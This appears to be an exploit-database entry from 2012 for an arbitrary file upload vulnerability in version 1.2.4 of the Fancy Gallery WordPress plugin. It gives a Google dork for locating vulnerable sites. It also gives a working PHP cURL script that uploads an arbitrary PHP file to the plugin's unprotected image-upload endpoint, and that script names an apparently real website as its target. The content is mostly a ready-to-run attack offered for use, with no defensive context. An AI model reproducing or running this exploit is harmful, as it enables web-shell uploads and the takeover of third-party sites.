##################################################
# Description : Wordpress Plugins - Fancy Gallery Arbitrary File Upload Vulnerability
# Version : 1.2.4
# link : http://codecanyon.net/item/fancy-gallery-wordpress-plugin/400535
# Price : 18$
# Date : 22-06-2012
# Google Dork : inurl:/wp-content/plugins/radykal-fancy-gallery/
# Site : 1337day.com Inj3ct0r Exploit Database
# Author : Sammy FORGIT - sam at opensyscom dot fr - http://www.opensyscom.fr
##################################################


Exploit :

<?php

$uploadfile="lo.php";

$ch =
curl_init("http://progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php");

curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS, array('file[]'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";

?>
